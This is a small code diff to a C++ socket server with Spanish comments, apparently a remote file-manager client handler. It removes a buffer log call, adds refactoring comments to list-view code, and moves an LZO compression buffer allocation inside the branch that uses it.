@@ -108,8 +108,6 @@ void Cliente_Handler::Spawn_Handler(){
 
         cBuffer[this->BytesRecibidos()] = '\0';
 
-        this->Log(cBuffer.get());
-        
         std::vector<std::string> vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 1);
         if (vcDatos.size() == 0) {
             this->Log("No se pudo procesar el buffer");
@@ -205,6 +203,7 @@ void Cliente_Handler::Spawn_Handler(){
                 ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
                 if (temp_list) {
                     if (vcFileEntry.size() >= 4) {
+                        //Hacer wrappers para manipular listview
                         int iCount = temp_list->GetItemCount() > 0 ? temp_list->GetItemCount() - 1 : 0;
                         temp_list->InsertItem(iCount, wxString("-"));
                         temp_list->SetItem(iCount, 1, wxString(vcFileEntry[1]));
@@ -226,7 +225,7 @@ void Cliente_Handler::Spawn_Handler(){
                 if (temp_list) {
                     for (int iCount = 0; iCount<int(vDrives.size()); iCount++) {
                         std::vector<std::string> vDrive = strSplit(vDrives[iCount], '|', 5);
-
+                        //Hacer wrappers para manipular listview
                         temp_list->InsertItem(iCount, wxString(vDrive[0]));
                         temp_list->SetItem(iCount, 1, wxString(vDrive[2]));
                         temp_list->SetItem(iCount, 2, wxString(vDrive[1]));
@@ -878,11 +877,10 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
     new_Buffer[1] = COMP_HEADER_BYTE_2;
     
     //Primero comprimir si el paquete es mayor a 512 bytes
-    lzo_uint out_len = 0;
-    std::shared_ptr<unsigned char[]> compData(new unsigned char[iDataSize + iDataSize / 16 / 64 + 3]);
-
     if (pLen > BUFFER_COMP_REQ_LEN) {
         //Comprimir  buffer
+        lzo_uint out_len = 0;
+        std::shared_ptr<unsigned char[]> compData(new unsigned char[iDataSize + iDataSize / 16 / 64 + 3]);
         if (compData) {
             if (this->lzo_Compress(reinterpret_cast<const unsigned char*>(pBuffer), pLen, compData, out_len) == LZO_E_OK) {
                 if (out_len+2 <= iDataSize) {
